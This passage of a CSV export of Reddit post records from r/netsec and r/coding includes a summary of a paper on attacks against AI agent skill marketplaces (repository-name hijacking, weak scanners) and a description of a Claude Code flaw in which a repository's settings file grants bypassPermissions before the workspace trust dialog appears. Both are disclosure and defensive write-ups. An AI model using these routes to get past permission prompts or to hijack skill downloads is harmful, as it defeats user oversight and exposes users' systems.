+     — Skills.sh and SkillsDirectory index agent skills by pointing to GitHub repository URLs rather than hosting files directly. When an original repository owner renames their GitHub account, the previous username becomes available. An adversary who claims that username and recreates the repository intercepts all future skill downloads. The authors found 121 skills forwarding to 7 vulnerable repositories. The most-downloaded hijackable skill had 2,032 downloads.
+    
+    
+    **Scanner disagreement**
+     — The paper tested 5 scanners against 238,180 unique skills from 4 marketplaces. Fail rates ranged from 3.79% (Snyk on Skills.sh) to 41.93% (OpenClaw scanner on ClawHub). Cross-scanner consensus was negligible: only 33 of 27,111 skills (0.12%) flagged by all five. When repository-context re-scoring was applied to the 2,887 scanner-flagged skills, only 0.52% remained in malicious-flagged repositories.
+    
+    
+    **Live credentials**
+     — A TruffleHog scan found 12 functioning API credentials (NVIDIA, ElevenLabs, Gemini, MongoDB, and others) embedded across the corpus.
+    
+    
+    **What to do:**
+    - Pin skills to specific commit hashes, not mutable branch heads
+    - Monitor for repository ownership changes on skills already deployed
+    - Require at minimum two independent scanners to flag a skill before treating as confirmed
+    - Prefer direct-hosting marketplaces (ClawHub's model) over link-out distribution
+    
+    
+    The repository hijacking vector is real and responsibly disclosed. The link-out distribution model is an architectural weakness — no patch resolves it.
+    
+    
+    We wrote a practitioner-focused analysis covering this and 6 other papers from this week at ",10,5
+1s03z8j,2026-03-22 05:56:30,reddit,r/netsec,LLVM Adventures: Fuzzing Apache Modules,5,0
+1rziu2w,2026-03-21 13:01:37,reddit,r/netsec,Trivy Under Attack Again: Widespread GitHub Actions Tag Compromise Exposes CI/CD Secrets Attackers,83,22
+1rz7g4q,2026-03-21 04:33:06,reddit,r/netsec,"Attack surface analysis of 5,121 MCP servers: 555 have toxic data flows where safe tools combine into dangerous paths",40,7
+1rz2xuw,2026-03-21 01:40:56,reddit,r/netsec,"Claude Code workspace trust dialog bypass via repository settings loading order [CVE-2026-33068, CVSS 7.7]. Settings resolved before trust dialog shown.     CVE-2026-33068 is a configuration loading order defect in Anthropic's Claude Code CLI tool (versions prior to 2.1.53). A malicious 
+    `.claude/settings.json`
+     file in a repository can bypass the workspace trust confirmation dialog by exploiting the order in which settings are resolved.
+    
+    The mechanism: Claude Code supports a 
+    `bypassPermissions`
+     field in settings files. This is a legitimate, documented feature intended for trusted workspaces. The vulnerability is that repository-level settings (
+    `.claude/settings.json`
+    ) are loaded and resolved before the workspace trust dialog is presented to the user. A malicious repository can include a settings file with 
+    `bypassPermissions`
+     entries, and those permissions are applied before the user has an opportunity to review and approve the workspace.
+    
+    This is CWE-807: Reliance on Untrusted Inputs in a Security Decision. The trust decision (whether to grant elevated permissions) depends on inputs from the entity being evaluated (the repository). The security boundary between ""untrusted repository"" and ""trusted workspace"" is bridged by the settings loading order.
+    
+    The fix in Claude Code 2.1.53 changes the loading order so that the trust dialog is presented before repository-level settings are resolved.
+    
+    Worth noting: 
+    `bypassPermissions`
+     is not a hidden feature or a misconfiguration. It is documented and useful for legitimate workflows. The bug is purely in the loading order.",28,2
+1ryban8,2026-03-20 04:23:35,reddit,r/netsec,A 32-Year-Old Bug Walks Into A Telnet Server (GNU inetutils Telnetd CVE-2026-32746) - watchTowr Labs,106,18
+1keo68j,2025-05-05 00:40:27,reddit,r/coding,"No ""I made a ____"" posts. No AI slop posts. No advertising. No discord links. No surveys. Please abide by the rules. Message the moderators the word ""tuna"" if you actually read them and feel like your post was removed or you were banned in error.",106,32
+1s3aea1,2026-03-25 21:14:13,reddit,r/coding,Spent way too long on this… but I think it represents my coding life pretty accurately 🦐💻,3,3
+1s37awr,2026-03-25 18:48:29,reddit,r/coding,I let GitHub users write on my profile and help me decorate my Readme.md,0,0
+1s35jzy,2026-03-25 17:04:09,reddit,r/coding,Enterprise RAG: Making AI Trustworthy With Retrieval,1,0
+1s2dm25,2026-03-24 21:21:40,reddit,r/coding,The Case for Becoming an Engineering Manager,12,0
+1s2zs9l,2026-03-25 11:31:38,reddit,r/coding,"When You Go to Production with gRPC, Make Sure You’ve Solved Load Distribution First",0,1
+1s2okdp,2026-03-25 03:57:06,reddit,r/coding,Developer Experience 2026: DX Is the Competitive Moat | RuneHub,1,1
+1s2uzo1,2026-03-25 08:00:17,reddit,r/coding,"I am going to do a computation data analysis internship (biochemistry type data) and I am trying to figure out what MacBook I should get. At the moment I am thinking about a Macbook Air 15"" M4 24GB 512GB. Would that be enough?",0,9
+1s291fw,2026-03-24 17:32:24,reddit,r/coding,jj-benchmark – Evaluating AI agents on Jujutsu version control,1,1
+1s2is30,2026-03-25 00:32:12,reddit,r/coding,LEARN CODING BASICS (REQUIRED IN IB CS),0,0
+1s1pypx,2026-03-24 02:57:00,reddit,r/coding,A table was all that was needed to fix Python autocomplete,11,2
+1s1rt81,2026-03-24 04:02:17,reddit,r/coding,Interactive Web UI: Next-Gen Frontend in 2026 | RuneHub,3,2
+1s1eia2,2026-03-23 19:41:58,reddit,r/coding,Pushing Python-native stream processing to 500k events per second with GlassFlow,4,1
+1s0ns8h,2026-03-22 22:58:41,reddit,r/coding,Makati Coding Scheme,2,0
+1s0sd5n,2026-03-23 01:55:52,reddit,r/coding,UI Micro-Interactions: Premium UX Patterns 2026 | RuneHub,0,0
+1s0gpz0,2026-03-22 16:54:08,reddit,r/coding,Check out: Writing Self-Modifying Code in JS Architecture,3,0
+1s0pt9l,2026-03-23 00:17:22,reddit,r/coding,Playing with Opencode Go SDK,1,0
+1s0q2ik,2026-03-23 00:27:31,reddit,r/coding,Rust vs C++: The Memory Safety Standard in 2026,0,5
+1s0we67,2026-03-23 04:30:07,reddit,r/coding,GitHub - ZhixiangLuo/10xProductivity: AI agent tool connections for 10x productivity,0,5
+1s0lwh3,2026-03-22 21:39:50,reddit,r/coding,"WebAssembly is breaking out of the browser. From server-side computing to edge deployments and plugin systems, WASM is becoming the universal runtime that containers promised but never fully delivered.",0,0
+1s0dtnd,2026-03-22 13:52:45,reddit,r/coding,I built a 1v1 Coding Battle Application (still in development),1,2
+1s0cn9p,2026-03-22 12:45:19,reddit,r/coding,What makes a DSA explanation “easy to understand” for beginners?,1,0
+1rz9sfq,2026-03-21 06:05:12,reddit,r/coding,Why Over-Engineering Happens,28,11
+1rzryyq,2026-03-21 21:49:57,reddit,r/coding,Understanding the Flyweight Design Pattern in Go: A Practical Guide,0,0
+1rzq947,2026-03-21 20:30:19,reddit,r/coding,I've built LinguAventura with @base44!,1,0
